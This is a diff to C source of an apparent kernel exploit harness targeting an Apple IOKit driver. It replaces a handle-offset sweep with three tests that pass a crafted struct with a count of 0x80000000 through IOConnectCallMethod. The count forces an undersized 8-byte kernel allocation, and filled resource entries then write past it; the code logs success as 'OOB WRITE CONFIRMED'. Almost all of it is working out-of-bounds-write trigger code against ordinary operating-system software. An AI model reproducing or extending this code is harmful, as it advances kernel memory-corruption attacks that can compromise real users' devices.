@@ -363,33 +363,68 @@ static void trigger_bof_iokit(void) {
      * group is registered with count=0x80000000 in its metadata */
     uint64_t ovf_gid = try_sgar(conn, 0x80000000u, "OVERFLOW_INT32MIN");
 
-    /* Phase 2: Add-to-existing overflow group trigger.
-     * SGAR creates new group when handle=0 (all-zeros struct).
-     * If handle is placed at offset H, SGAR finds the existing group by that handle
-     * and tries to ADD count resources to its (undersized) backing array → OOB write.
-     * Probe handle_off sweep: 0x00, 0x04, 0x08 (most likely locations for group handle). */
-    if (ovf_gid) {
-        static const uint32_t handle_offsets[] = { 0x00, 0x04, 0x08, 0x0c, 0x10 };
-        for (int hi = 0; hi < 5; hi++) {
-            uint32_t hoff = handle_offsets[hi];
-            char lbl[64];
-            snprintf(lbl, sizeof(lbl), "ADD_TO_OVF_off%02x", hoff);
-            /* Add 2 resources to overflow group (8-byte backing array) → OOB write by 40 bytes */
-            try_sgar_ex(conn, 2, lbl, (uint32_t)ovf_gid, hoff);
+    /* Phase 2: OOB write proof — fill resource entry section with non-zero handle (1).
+     * SGAR always creates new group. OOB happens when kernel copies resource
+     * entries from struct[0x28..] into the 8-byte undersized allocation.
+     * With count=0x80000000: alloc=8 bytes, but ~125/41 entries available → OOB.
+     * Test three entry sizes to find the actual format used by the kernel. */
+
+    /* Test A: uint32_t entries (4-byte handles) at [+0x28], ~250 entries */
+    {
+        static uint8_t oob_s[SGAR_STRUCT_SIZE];
+        uint8_t oob_out[0x10]; size_t oob_out_sz = sizeof(oob_out); uint32_t oob_cnt = 0;
+        memset(oob_s, 0, sizeof(oob_s));
+        *(uint32_t *)(oob_s + SGAR_COUNT_OFFSET) = 0x80000000u;
+        for (uint32_t off = 0x28; off + 4 <= SGAR_STRUCT_SIZE; off += 4)
+            *(uint32_t *)(oob_s + off) = 0x00000001u;
+        kern_return_t okr = IOConnectCallMethod(conn, SGAR_SELECTOR,
+            NULL, 0, oob_s, sizeof(oob_s), NULL, &oob_cnt, oob_out, &oob_out_sz);
+        evf("[BOF] OOB_4B count=0x80000000 entries@0x28=0x1 kr=0x%x", okr);
+        if (okr == 0) {
+            uint64_t gid = *(uint64_t *)oob_out;
+            evf("[BOF] OOB_4B SUCCESS gid=0x%llx: kernel wrote non-zero entries to 8-byte alloc OOB CONFIRMED", gid);
         }
-        evf("[BOF] HANDLE_SWEEP_DONE: any ADD_TO_OVF with kr=0x0 and DIFFERENT group_id=0x%x = OOB confirmed", (uint32_t)ovf_gid);
     }
 
-    /* Phase 3: trigger lifecycle via sel=7 */
+    /* Test B: uint64_t entries (8-byte handles) at [+0x28], ~125 entries */
+    {
+        static uint8_t oob_s[SGAR_STRUCT_SIZE];
+        uint8_t oob_out[0x10]; size_t oob_out_sz = sizeof(oob_out); uint32_t oob_cnt = 0;
+        memset(oob_s, 0, sizeof(oob_s));
+        *(uint32_t *)(oob_s + SGAR_COUNT_OFFSET) = 0x80000000u;
+        for (uint32_t off = 0x28; off + 8 <= SGAR_STRUCT_SIZE; off += 8)
+            *(uint64_t *)(oob_s + off) = 0x0000000000000001ull;
+        kern_return_t okr = IOConnectCallMethod(conn, SGAR_SELECTOR,
+            NULL, 0, oob_s, sizeof(oob_s), NULL, &oob_cnt, oob_out, &oob_out_sz);
+        evf("[BOF] OOB_8B count=0x80000000 entries@0x28=0x1 kr=0x%x", okr);
+        if (okr == 0) {
+            uint64_t gid = *(uint64_t *)oob_out;
+            evf("[BOF] OOB_8B SUCCESS gid=0x%llx: OOB WRITE CONFIRMED (8-byte entry format)", gid);
+        }
+    }
+
+    /* Test C: 24-byte structs at [+0x28], ~41 entries; first field = handle */
+    {
+        static uint8_t oob_s[SGAR_STRUCT_SIZE];
+        uint8_t oob_out[0x10]; size_t oob_out_sz = sizeof(oob_out); uint32_t oob_cnt = 0;
+        memset(oob_s, 0, sizeof(oob_s));
+        *(uint32_t *)(oob_s + SGAR_COUNT_OFFSET) = 0x80000000u;
+        for (uint32_t off = 0x28; off + 24 <= SGAR_STRUCT_SIZE; off += 24)
+            *(uint32_t *)(oob_s + off) = 0x00000001u;
+        kern_return_t okr = IOConnectCallMethod(conn, SGAR_SELECTOR,
+            NULL, 0, oob_s, sizeof(oob_s), NULL, &oob_cnt, oob_out, &oob_out_sz);
+        evf("[BOF] OOB_24B count=0x80000000 entries@0x28=0x1 kr=0x%x", okr);
+        if (okr == 0) {
+            uint64_t gid = *(uint64_t *)oob_out;
+            evf("[BOF] OOB_24B SUCCESS gid=0x%llx: OOB WRITE CONFIRMED (24-byte entry format)", gid);
+        }
+    }
+
+    /* Phase 3: trigger lifecycle via sel=7 on overflow group */
     if (ovf_gid) {
         evf("[BOF] SEL7 on overflow group_id=0x%llx", ovf_gid);
         try_sel7(conn, (uint32_t)ovf_gid, "SEL7_OVERFLOW");
     }
-
-    /* Variant overflow count */
-    uint64_t ovf2_gid = try_sgar(conn, 0x20000000u, "OVERFLOW_0x20000000");
-    if (ovf2_gid)
-        try_sel7(conn, (uint32_t)ovf2_gid, "SEL7_OVF2");
 
     IOServiceClose(conn);
     evf("[BOF] IOKIT_DONE");
